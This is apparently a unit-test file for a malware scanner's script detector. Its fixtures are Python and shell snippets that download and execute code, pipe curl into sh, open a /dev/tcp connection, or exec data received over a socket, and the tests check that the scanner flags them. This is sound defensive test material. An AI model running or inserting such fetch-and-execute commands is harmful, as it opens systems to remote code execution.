"""Plan 2.3: .py / .sh handlers in the script detector."""
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from pecheck.detectors import script  # noqa: E402
from pecheck.model import Target, CRITICAL  # noqa: E402
from pecheck.scan import scan_file  # noqa: E402


def target(ext, data):
    return Target(path=f"t{ext}", size=len(data), sha256="0" * 64, kind="SCRIPT", raw=data)


def run(ext, data):
    return script.run(target(ext, data))


class TestPy(unittest.TestCase):
    def test_download_exec_critical(self):
        f = run(".py", b"import urllib.request\nd = urllib.request.urlopen('http://x/p')\nexec(d.read())\n")
        self.assertTrue(any(x.severity == CRITICAL and "download+execute" in x.detail for x in f))

    def test_decode_exec_critical(self):
        f = run(".py", b"import base64\nx = base64.b64decode(payload)\nexec(x)\n")
        self.assertTrue(any(x.severity == CRITICAL and "decode+execute" in x.detail for x in f))

    def test_benign_requests_clean(self):
        f = run(".py", b"import requests\nr = requests.get('https://api.example.com/v1')\nprint(r)\n")
        self.assertEqual([x for x in f if x.severity == CRITICAL], [])

    def test_dl_subprocess_note(self):
        f = run(".py", b"import urllib.request\nimport subprocess\nurllib.request.urlopen(u)\nsubprocess.run(['ls'])\n")
        self.assertTrue(any("downloader tokens + subprocess" in x.detail for x in f))

    def test_os_system_chmod_note(self):
        f = run(".py", b"os.system('chmod +x run.sh')\n")
        self.assertTrue(any("chmod" in x.detail for x in f))


class TestSh(unittest.TestCase):
    def test_curl_pipe_sh_critical(self):
        f = run(".sh", b"#!/bin/sh\ncurl -fsSL http://x/s | sh\n")
        self.assertTrue(any(x.severity == CRITICAL and "shell" in x.detail for x in f))

    def test_dev_tcp_critical(self):
        f = run(".sh", b"bash -c 'cat < /dev/tcp/1.2.3.4/4444'\n")
        self.assertTrue(any(x.severity == CRITICAL and "/dev/tcp/" in x.detail for x in f))

    def test_chmod_hidden_dir(self):
        f = run(".sh", b"chmod +x /tmp/.x/payload\ncurl http://x -o /tmp/.x/payload\n")
        self.assertTrue(any("hidden-dir" in x.detail for x in f))

    def test_benign_clean(self):
        f = run(".sh", b"#!/bin/sh\necho hi\nls -l\n")
        self.assertEqual(f, [])


class TestScanIntegration(unittest.TestCase):
    def test_py_scan(self):
        d = tempfile.mkdtemp(prefix="pecheck_py_")
        p = os.path.join(d, "stage2.py")
        open(p, "wb").write(b"import socket, subprocess\ns = socket.socket()\n"
                            b"exec(s.recv(1024))\n")
        r = scan_file(p)
        self.assertEqual(r.verdict, "REVIEW")


if __name__ == "__main__":
    unittest.main()
